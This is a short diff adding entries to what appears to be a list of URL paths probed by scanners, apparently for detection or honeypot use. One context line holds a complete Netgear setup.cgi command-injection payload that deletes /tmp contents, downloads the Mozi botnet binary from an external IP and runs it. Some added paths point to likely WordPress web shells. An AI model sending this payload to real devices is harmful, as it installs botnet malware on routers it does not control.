@@ -11557,3 +11557,6 @@ http://www.ip138.com/
 /panel
 /.svn
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.164.177.56:10825/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/upload/fw
+/wp-content/marijuana.php
+/wp-content/plugins/xwp/up.php
